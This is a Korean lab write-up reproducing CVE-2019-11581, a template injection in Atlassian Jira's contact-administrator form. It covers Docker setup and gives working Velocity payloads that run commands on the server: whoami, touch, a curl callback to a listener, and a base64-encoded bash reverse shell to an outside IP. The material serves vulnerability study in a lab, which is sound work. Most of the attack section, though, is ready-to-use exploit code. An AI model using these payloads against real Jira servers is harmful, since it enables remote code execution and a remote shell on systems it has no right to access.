Atlassian Jira 템플릿 삽입 취약점(CVE-2019-11581)을 악용한 리버스 쉘 공격

Atlassian Jira는 기업에서 널리 사용되는 프로젝트 및 트랜잭션 추적 도구로 결함 추적, 고객 서비스, 요구 사항 수집, 프로세스 승인, 작업 추적, 프로젝트 추적 및 민첩한 관리와 같은 작업 분야에서 널리 사용됩니다. 여러 버전 전에 템플릿 주입을 이용한 임의의 명령을 실행이 가능합니다.：

- 4.4.x
- 5.x.x
- 6.x.x
- 7.0.x
- 7.1.x
- 7.2.x
- 7.3.x
- 7.4.x
- 7.5.x
- 7.6.x before 7.6.14 (the fixed version for 7.6.x)
- 7.7.x
- 7.8.x
- 7.9.x
- 7.10.x
- 7.11.x
- 7.12.x
- 7.13.x before 7.13.5 (the fixed version for 7.13.x)
- 8.0.x before 8.0.3 (the fixed version for 8.0.x)
- 8.1.x before 8.1.2 (the fixed version for 8.1.x)
- 8.2.x before 8.2.3 (the fixed version for 8.2.x)

참고자료:

- https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
- https://jira.atlassian.com/browse/JRASERVER-69532
- https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw
- https://blog.csdn.net/whatday/article/details/111463939
- https://cloud.tencent.com/developer/article/1526557
- https://blog.csdn.net/qq_45746286/article/details/128774872
- https://github.com/vulhub/vulhub/tree/master/jira/CVE-2019-11581

## 환경 구축

CVE-2019-11581 경로에서 터미널 실행

Jira Server 8.1.0 시작：
```
docker compose up -d
```
![](images/1.png)
환경이 시작된 후 http://localhost:8080 설치 가이드로 들어가 "한국어"로 전환
        - 만약 localhost가 안 된다면 http://your-ip:8080
        
![](images/2.png)
VPS 조건에서 "Set it to me"(첫 번째 항목)를 선택한 다음 Atlassian 공식으로 이동하여 Jira Server 테스트 인증서를 신청(Data Center 및 Addons 선택 안 함):

![](images/3.png)
설치 진행(작은 메모리 VPS 단계는 설치에 실패하거나 시간이 오래 걸릴 수 있으므로 4GB 이상의 메모리 공간 권장)

![](images/4.png)  
SMTP 이메일 서버 추가 `http://localhost:8080/secure/admin/AddSmtpMailServer!default.jspa`

![](images/5.png)
정상적으로 설정이 됐는지 확인

시스템 설정을 입력 `http://localhost:8080/secure/admin/ViewApplicationProperties.jspa` 로 이동

![](images/6.png)
우측의 설정편집 클릭

![](images/7.png)
"관리자에게 연락 양식"을 ON으로 변경

![](images/8.png)
저장

![](images/9.png)
변경 확인


## 취약점 재연

PoC는 CVE-2019-3396과 동일하게 진행
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('calc').toString()
```

원래 취약점에서는 계산기를 띄우지만 Linux는 calc가 없으므로 whoami로 변경

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()
```

PoC를 직접 하려면 `poc.py`를 실행하거나 `http://localhost:8080/secure/ContactAdministrators!default.jspa`에서 입력

![](images/10.png)
로그아웃시 '관리자 연락 페이지'로 쉽게 이동 가능함

![](images/11.png)
해당 poc 입력 후 send

![](images/12.png)
smtpd의 로그를 확인해보면 성공적으로 메일이 전송됨



### 추가1 touch
직관적으로 와닿지 않으니 조금 더 해보자
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('touch RCE').toString()
```
![](images/13.png)
jira 서버에서 ls를 쳐보면 RCE라는 파일이 없음

![](images/14.png)
'tocuh RCE'를 넣고 send

![](images/15.png)
만약 mtpd에 데이터가 표시되지 않으면 메일 대기열 확인 `http://localhost:8080/secure/admin/MailQueueAdmin!default.jspa`

![](images/16.png)
전송이 완료되었다면 다시 jira 서버에서 ls 입력
RCE라는 파일이 생성되어 있음


### 추가2 curl
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec("curl your-ip:13131").waitFor()
```
![](images/17.png)
nc 13131 포트 수신 대기

![](images/18.png)
curl로 요청

![](images/19.png)
수신

## 추가3 리버스쉘
```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec("bash -c {echo,YmFzaCAtaT4mL2Rldi90Y3AvMTcyLjMwLjEuMjYvMTMxMzEgMD4mMQ==}|{base64,-d}|{bash,-i}").waitFor()
```
![](images/20.png)
Runtime.getRuntime().exec()가 파이프라인 명령어를 실행할 수 없으므로 exec 명령어를 base64로 인코딩

![](images/21.png)
13131포트로 수신 대기

![](images/22.png)
위에서 복사한 poc로 전송

![](images/23.png)
쉘 획득

![](images/23.png)
ls 입력